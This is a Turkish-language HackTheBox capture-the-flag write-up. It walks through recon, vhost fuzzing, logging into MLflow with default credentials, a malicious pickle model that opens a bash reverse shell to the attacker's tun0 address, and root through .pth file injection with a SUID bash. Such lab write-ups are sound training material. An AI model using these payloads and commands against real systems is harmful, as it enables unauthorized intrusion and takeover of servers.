@@ -1,0 +1,215 @@
+## 1. Keşif (Recon)
+
+Makineye bağlandıktan sonra ilk işimiz hangi portların açık olduğunu görmek.
+
+```bash
+nmap -sC -sV -p- --min-rate 5000 -oN nmap_full.txt *
+```
+
+Sonuç oldukça sade çıktı, sadece iki port açık:
+
+```
+22/tcp  open  ssh     OpenSSH 8.9p1
+80/tcp  open  http    nginx/1.18.0 (Ubuntu)
+```
+
+HTTP servisini tarayıcıdan açınca bizi işe alım platformuna ait bir arayüz karşıladı. Kayıt olup giriş yaptıktan sonra dashboard'da birkaç özellik dikkatimizi çekti: CSV yükleme, model eğitimi ve tahmin (predict) fonksiyonları.
+
+---
+
+## 2. Web Keşfi ve Gizli VHost Bulma
+
+Feroxbuster ile dizin taraması yapılmış olsa da asıl önemli buluş **vhost fuzzing** ile geldi. HackTheBox makinelerinde pasif araçlar (subfinder vb.) çalışmaz çünkü domainler CT loglarında yer almaz. Bu yüzden ffuf ile Host header fuzzing yaptık.
+
+```bash
+ffuf -u http://smarthire.htb -H "Host: FUZZ.smarthire.htb" \
+  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
+  -fs 178
+```
+
+Binlerce 301 yanıtı arasında yalnızca bir tanesi farklı çıktı:
+
+```
+models   [Status: 401, Size: 137, Duration: 136ms]
+```
+
+`models.smarthire.htb` gerçek bir vhost'tu ve 401 döndürüyordu. `/etc/hosts` dosyasına ekleyip erişmeye çalıştık:
+
+```
+WWW-Authenticate: Basic realm="mlflow"
+```
+
+MLflow tracking server'ı bulmuştuk!
+
+---
+
+## 3. MLflow'a Giriş
+
+MLflow'un built-in auth plugin'inin varsayılan kimlik bilgilerini denedik:
+
+```bash
+curl -u "admin:password" http://models.smarthire.htb/api/2.0/mlflow/registered-models/list
+```
+
+İşe yaradı. MLflow 2.14.1 sürümü çalışıyordu ve içeride kayıtlı bir model vardı:
+
+```json
+{
+  "name": "xencod-4725734a160f-model",
+  "version": "2",
+  "current_stage": "None",
+  "source": "mlflow-artifacts:/0/ae061e04.../artifacts/model"
+}
+```
+
+Model adındaki `xencod-4725734a160f` kısmı kullanıcı ID'sinden türetiliyordu. Ana uygulamanın bu modeli `/predict` endpoint'i aracılığıyla yüklediğini anladık.
+
+---
+
+## 4. Pickle Deserialization ile RCE
+
+MLflow, Python modellerini `cloudpickle` ile serialize eder. Kötü amaçlı bir pickle dosyası model olarak yüklenip `/predict` endpoint'i tetiklendiğinde kod çalıştırılabilir.
+
+`mlflow` Python paketi kurmaya gerek kalmadan REST API üzerinden saldırıyı gerçekleştirdik.
+
+**Adım 1: MLflow'da yeni bir run oluştur**
+
+```bash
+RUN_ID=$(curl -s -u "admin:password" -X POST \
+  "http://models.smarthire.htb/api/2.0/mlflow/runs/create" \
+  -H "Content-Type: application/json" \
+  -d '{"experiment_id": "0"}' | python3 -c "import sys,json; print(json.load(sys.stdin)['run']['info']['run_id'])")
+```
+
+**Adım 2: Kötü amaçlı pickle oluştur**
+
+```python
+import pickle, os
+
+class RCE:
+    def __reduce__(self):
+        return (os.system, ("bash -c 'bash -i >& /dev/tcp/tun0/4444 0>&1'",))
+
+with open('python_model.pkl', 'wb') as f:
+    pickle.dump(RCE(), f)
+```
+
+**Adım 3: MLmodel metadata dosyası oluştur**
+
+```yaml
+artifact_path: model
+flavors:
+  python_function:
+    loader_module: mlflow.pyfunc.model
+    pickle_module_name: cloudpickle
+    python_model: python_model.pkl
+    python_version: 3.10.12
+mlflow_version: 2.14.1
+```
+
+**Adım 4: Artifact'ları yükle**
+
+```bash
+curl -s -u "admin:password" -X PUT \
+  "http://models.smarthire.htb/api/2.0/mlflow-artifacts/artifacts/0/$RUN_ID/artifacts/model/MLmodel" \
+  --data-binary @MLmodel
+
+curl -s -u "admin:password" -X PUT \
+  "http://models.smarthire.htb/api/2.0/mlflow-artifacts/artifacts/0/$RUN_ID/artifacts/model/python_model.pkl" \
+  --data-binary @python_model.pkl
+```
+
+**Adım 5: Modeli register et**
+
+```bash
+curl -s -u "admin:password" -X POST \
+  "http://models.smarthire.htb/api/2.0/mlflow/model-versions/create" \
+  -H "Content-Type: application/json" \
+  -d "{\"name\": \"xencod-4725734a160f-model\", \"source\": \"mlflow-artifacts:/0/$RUN_ID/artifacts/model\", \"run_id\": \"$RUN_ID\"}"
+```
+
+**Adım 6: `/predict` endpoint'ini tetikle**
+
+Bir tarafta `nc -lvnp 4444` dinlerken, geçerli oturum cookie'siyle tahmin endpoint'ine CSV gönderdik:
+
+```bash
+echo -e "name,experience,skills\ntest,5,python" > test.csv
+
+curl -s -b "session=<oturum_cookie>" \
+  -F "file=@test.csv" \
+  http://smarthire.htb/predict
+```
+
+Uygulama modeli yüklediği anda reverse shell bağlantısı geldi.
+
+---
+
+## 5. User Flag
+
+Shell `svcweb` kullanıcısı olarak açıldı. Home dizininde flag bekliyordu:
+
+```bash
+cat /home/svcweb/user.txt
+```
+
+`*`
+
+---
+
+## 6. Yetki Yükseltme (Root)
+
+`sudo -l` çıktısı ilginç bir şey gösterdi:
+
+```
+(root) NOPASSWD: /usr/bin/python3.10 /opt/tools/mlflow_ctl/mlflowctl.py *
+```
+
+Script'i incelediğimizde `plugins/` dizinindeki tüm alt klasörleri `site.addsitedir()` ile Python path'e eklediğini gördük, ardından `mlflow_actions` ve `backup_models` modüllerini import ediyordu.
+
+```
+/opt/tools/mlflow_ctl/plugins/
+├── core/          (root:root, 755 — yazılamaz)
+│   ├── mlflow_actions.py
+│   └── backup_models.py
+└── dev/           (root:devs, 775 — YAZILABILIR!)
+```
+
+`id` komutu `svcweb`'in `devs` grubunda olduğunu doğruladı. `site.addsitedir()` çağrısı sırasında `.pth` uzantılı dosyalar otomatik olarak execute edilir. Bu yüzden kötü amaçlı bir `.pth` dosyası yazmak yeterliydi:
+
+```bash
+echo "import os; os.system('chmod +s /bin/bash')" > /opt/tools/mlflow_ctl/plugins/dev/exploit.pth
+
+sudo /usr/bin/python3.10 /opt/tools/mlflow_ctl/mlflowctl.py status
+
+/bin/bash -p
+```
+
+```
+euid=0(root)
+```
+
+```bash
+cat /root/root.txt
+```
+*
+---
+
+## Özet Saldırı Zinciri
+
+```
+ffuf vhost fuzzing
+        ↓
+models.smarthire.htb (MLflow — 401)
+        ↓
+Varsayılan kimlik bilgileri: admin:password
+        ↓
+Kötü amaçlı pickle modeli yükleme (REST API)
+        ↓
+/predict tetikleme → Pickle deserialization → RCE
+        ↓
+svcweb shell → user.txt
+        ↓
+sudo mlflowctl.py + .pth injection (devs grubu)
+        ↓
+SUID bash → root.txt
+```
